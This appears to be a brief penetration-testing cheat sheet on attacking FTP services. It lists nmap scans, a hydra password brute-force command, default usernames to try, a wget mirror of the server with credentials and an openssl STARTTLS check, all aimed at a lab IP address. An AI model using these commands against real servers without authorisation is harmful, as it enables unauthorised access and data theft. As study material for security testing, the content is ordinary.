<details>
  <summary>Brute Force</summary>

    - nmap -p 21 10.10.10.1
    - hydra -l admin -P /path/to/password-list.txt ftp://10.10.10.1

    or use default credentials like
    - anonymous - root - kali - admin ..etc
</details>

-------------------------------------------------------------------------------------------------------

#### Look if debug & trace mode is on or not

-------------------------------------------------------------------------------------------------------

#### $ wget -m --no-passive ftp://username:password@10.10.10.1

-------------------------------------------------------------------------------------------------------

#### $ openssl s_client -connect 10.10.10.1:21 -starttls ftp
  - if the server is encrypted with TLS/SSL

-------------------------------------------------------------------------------------------------------

#### $ nmap 10.10.10.1 -p21 --script=ftp-*

